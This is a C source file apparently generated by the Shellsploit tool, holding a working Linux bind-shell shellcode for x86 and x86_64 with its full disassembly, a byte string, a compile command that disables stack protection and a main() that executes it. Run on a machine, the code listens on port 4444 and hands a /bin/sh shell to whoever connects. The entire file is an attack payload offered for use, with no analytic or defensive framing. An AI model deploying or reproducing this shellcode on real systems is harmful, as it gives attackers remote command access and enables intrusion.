/*
[+] Author  : B3mB4m
[~] Contact : b3mb4m@protonmail.com
[~] Project : https://github.com/b3mb4m/Shellsploit
[~] Greetz  : Bomberman,T-Rex,KnocKout,ZoRLu


#If you want test it, you must compile it within x86 OS.
#Or basically you can get it with shellsploit.
#Default setthings for port:4444


00000000  31C0              xor eax,eax
00000002  40                inc eax
00000003  7460              jz 0x65
00000005  31DB              xor ebx,ebx
00000007  F7E3              mul ebx
00000009  B066              mov al,0x66
0000000B  B301              mov bl,0x1
0000000D  52                push edx
0000000E  53                push ebx
0000000F  6A02              push byte +0x2
00000011  89E1              mov ecx,esp
00000013  CD80              int 0x80
00000015  89C6              mov esi,eax
00000017  B066              mov al,0x66
00000019  43                inc ebx
0000001A  52                push edx
0000001B  6668115C          push word 0x5c11
0000001F  6653              push bx
00000021  89E1              mov ecx,esp
00000023  6A10              push byte +0x10
00000025  51                push ecx
00000026  56                push esi
00000027  89E1              mov ecx,esp
00000029  CD80              int 0x80
0000002B  B066              mov al,0x66
0000002D  B304              mov bl,0x4
0000002F  52                push edx
00000030  56                push esi
00000031  89E1              mov ecx,esp
00000033  CD80              int 0x80
00000035  B066              mov al,0x66
00000037  B305              mov bl,0x5
00000039  52                push edx
0000003A  52                push edx
0000003B  56                push esi
0000003C  89E1              mov ecx,esp
0000003E  CD80              int 0x80
00000040  93                xchg eax,ebx
00000041  31C9              xor ecx,ecx
00000043  B102              mov cl,0x2
00000045  B03F              mov al,0x3f
00000047  CD80              int 0x80
00000049  49                dec ecx
0000004A  79F9              jns 0x45
0000004C  92                xchg eax,edx
0000004D  50                push eax
0000004E  682F2F7368        push dword 0x68732f2f
00000053  682F62696E        push dword 0x6e69622f
00000058  89E3              mov ebx,esp
0000005A  50                push eax
0000005B  53                push ebx
0000005C  89E1              mov ecx,esp
0000005E  50                push eax
0000005F  89E2              mov edx,esp
00000061  B00B              mov al,0xb
00000063  CD80              int 0x80
00000065  48                dec eax
00000066  31C0              xor eax,eax
00000068  48                dec eax
00000069  31FF              xor edi,edi
0000006B  48                dec eax
0000006C  31F6              xor esi,esi
0000006E  48                dec eax
0000006F  31D2              xor edx,edx
00000071  4D                dec ebp
00000072  31C0              xor eax,eax
00000074  6A02              push byte +0x2
00000076  5F                pop edi
00000077  6A01              push byte +0x1
00000079  5E                pop esi
0000007A  6A06              push byte +0x6
0000007C  5A                pop edx
0000007D  6A29              push byte +0x29
0000007F  58                pop eax
00000080  0F05              syscall
00000082  49                dec ecx
00000083  89C0              mov eax,eax
00000085  4D                dec ebp
00000086  31D2              xor edx,edx
00000088  41                inc ecx
00000089  52                push edx
0000008A  41                inc ecx
0000008B  52                push edx
0000008C  C6042402          mov byte [esp],0x2
00000090  66C7442402115C    mov word [esp+0x2],0x5c11
00000097  48                dec eax
00000098  89E6              mov esi,esp
0000009A  41                inc ecx
0000009B  50                push eax
0000009C  5F                pop edi
0000009D  6A10              push byte +0x10
0000009F  5A                pop edx
000000A0  6A31              push byte +0x31
000000A2  58                pop eax
000000A3  0F05              syscall
000000A5  41                inc ecx
000000A6  50                push eax
000000A7  5F                pop edi
000000A8  6A01              push byte +0x1
000000AA  5E                pop esi
000000AB  6A32              push byte +0x32
000000AD  58                pop eax
000000AE  0F05              syscall
000000B0  48                dec eax
000000B1  89E6              mov esi,esp
000000B3  48                dec eax
000000B4  31C9              xor ecx,ecx
000000B6  B110              mov cl,0x10
000000B8  51                push ecx
000000B9  48                dec eax
000000BA  89E2              mov edx,esp
000000BC  41                inc ecx
000000BD  50                push eax
000000BE  5F                pop edi
000000BF  6A2B              push byte +0x2b
000000C1  58                pop eax
000000C2  0F05              syscall
000000C4  59                pop ecx
000000C5  4D                dec ebp
000000C6  31C9              xor ecx,ecx
000000C8  49                dec ecx
000000C9  89C1              mov ecx,eax
000000CB  4C                dec esp
000000CC  89CF              mov edi,ecx
000000CE  48                dec eax
000000CF  31F6              xor esi,esi
000000D1  6A03              push byte +0x3
000000D3  5E                pop esi
000000D4  48                dec eax
000000D5  FFCE              dec esi
000000D7  6A21              push byte +0x21
000000D9  58                pop eax
000000DA  0F05              syscall
000000DC  75F6              jnz 0xd4
000000DE  48                dec eax
000000DF  31FF              xor edi,edi
000000E1  57                push edi
000000E2  57                push edi
000000E3  5E                pop esi
000000E4  5A                pop edx
000000E5  48                dec eax
000000E6  BF2F2F6269        mov edi,0x69622f2f
000000EB  6E                outsb
000000EC  2F                das
000000ED  7368              jnc 0x157
000000EF  48                dec eax
000000F0  C1EF08            shr edi,byte 0x8
000000F3  57                push edi
000000F4  54                push esp
000000F5  5F                pop edi
000000F6  6A3B              push byte +0x3b
000000F8  58                pop eax
000000F9  0F05              syscall
*/


//Project : https://github.com/b3mb4m/Shellsploit
//This file created with shellsploit ..
//19/01/2016 - 00:36:45
//Compile : gcc -fno-stack-protector -z execstack shell.c -o shell

unsigned char shellcode[] =
"\x31\xc0\x40\x74\x60\x31\xdb\xf7\xe3\xb0\x66\xb3\x01\x52\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xb0\x66\x43\x52\x66\x68\x11\x5c\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x52\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x52\x52\x56\x89\xe1\xcd\x80\x93\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x92\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x50\x89\xe2\xb0\x0b\xcd\x80\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0\x4d\x31\xd2\x41\x52\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24\x02\x11\x5c\x48\x89\xe6\x41\x50\x5f\x6a\x10\x5a\x6a\x31\x58\x0f\x05\x41\x50\x5f\x6a\x01\x5e\x6a\x32\x58\x0f\x05\x48\x89\xe6\x48\x31\xc9\xb1\x10\x51\x48\x89\xe2\x41\x50\x5f\x6a\x2b\x58\x0f\x05\x59\x4d\x31\xc9\x49\x89\xc1\x4c\x89\xcf\x48\x31\xf6\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05";

int main(void){
    (*(void(*)()) shellcode)();
}